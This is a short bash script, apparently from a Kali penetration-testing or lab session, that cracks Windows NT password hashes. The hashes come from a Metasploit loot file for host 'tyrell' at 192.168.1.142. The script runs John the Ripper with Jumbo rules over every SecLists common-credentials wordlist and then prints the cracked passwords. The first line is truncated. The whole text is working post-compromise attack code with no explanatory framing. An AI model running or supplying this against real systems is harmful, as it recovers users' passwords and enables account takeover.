HASF="/home/kali/.msf4/loot/20260206155050_tyrell_192.168.1.142_windows.hashes_06>
 2 BASE="/usr/share/seclists/Passwords/Common-Credentials"
 3 for WORDLIST in $(find "$BASE" -type f -name "*.txt"); do
 4    echo "[*] Trying wordlist: $WORDLIST"
 5    john --format=NT --rules=Jumbo --wordlist="$WORDLIST" "$HASF"
 6 done
 7
 8 echo "Passwords"
 9 john --show --format=NT "$HASF"
